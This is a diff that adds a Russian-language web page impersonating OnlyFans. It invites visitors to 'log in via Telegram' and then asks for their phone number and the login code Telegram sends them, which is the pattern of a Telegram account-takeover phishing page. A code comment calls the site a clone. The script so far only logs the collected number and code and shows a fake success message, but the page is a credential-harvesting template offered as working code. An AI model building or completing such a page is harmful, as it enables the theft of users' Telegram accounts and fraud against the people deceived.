@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OnlyFans</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(180deg, #0a2540 0%, #1e3a5f 100%);
+            color: white;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .header {
+            padding: 15px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 500;
+        }
+        
+        .logo {
+            font-size: 42px;
+            font-weight: bold;
+            margin: 20px 0 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .main {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .title {
+            font-size: 28px;
+            line-height: 1.3;
+            margin: 20px 0 40px;
+        }
+        
+        .bottom-btn {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #229ed9;
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 17px;
+            font-weight: 500;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 15px rgba(34, 158, 217, 0.4);
+        }
+        
+        .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            color: #000;
+            width: 90%;
+            max-width: 380px;
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            z-index: 100;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px;
+            margin: 15px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 18px;
+        }
+        
+        .blue-btn {
+            background: #229ed9;
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 500;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">OnlyFans</div>
+    
+    <div class="main">
+        <div class="logo">
+            <span style="font-size:50px;">🦋</span> OnlyFans
+        </div>
+        <div class="title">
+            Зарегистрируйтесь,<br>чтобы поддержать<br>любимых авторов
+        </div>
+    </div>
+
+    <!-- Кнопка внизу -->
+    <button class="bottom-btn" onclick="showPhoneModal()">
+        <span style="font-size:24px;">✉️</span>
+        ВОЙТИ ЧЕРЕЗ TELEGRAM
+    </button>
+
+    <!-- Модальное окно с номером телефона -->
+    <div id="phone-modal" class="modal" style="display:none;">
+        <h2 style="margin:0 0 20px 0; text-align:center;">Войдите через Telegram аккаунт</h2>
+        <p style="margin:10px 0 5px; color:#555;">Номер телефона</p>
+        <input type="tel" id="phone-input" placeholder="+7" value="+">
+        <button class="blue-btn" onclick="sendCode()">Продолжить</button>
+    </div>
+
+    <!-- Модальное окно с кодом -->
+    <div id="code-modal" class="modal" style="display:none;">
+        <h2 style="margin:0 0 20px 0; text-align:center;">Введите код, отправленный Вам в Telegram</h2>
+        <p style="margin:10px 0 5px; color:#555;">Введите код</p>
+        <input type="text" id="code-input" maxlength="6" placeholder="123456">
+        <button class="blue-btn" onclick="verifyCode()">Продолжить</button>
+    </div>
+
+    <script>
+        function showPhoneModal() {
+            document.getElementById('phone-modal').style.display = 'block';
+        }
+        
+        function sendCode() {
+            const phone = document.getElementById('phone-input').value;
+            console.log('📱 Номер введён:', phone);
+            document.getElementById('phone-modal').style.display = 'none';
+            document.getElementById('code-modal').style.display = 'block';
+            alert('Код отправлен на ' + phone);
+        }
+        
+        function verifyCode() {
+            const code = document.getElementById('code-input').value;
+            console.log('✅ Код подтверждён:', code);
+            alert('✅ Регистрация прошла успешно!');
+            // Здесь можно добавить переход на главную страницу клона
+        }
+        
+        // Закрытие модалок по клику вне окна (по желанию)
+        document.addEventListener('click', function(e) {
+            const modals = document.querySelectorAll('.modal');
+            modals.forEach(modal => {
+                if (e.target === modal) modal.style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
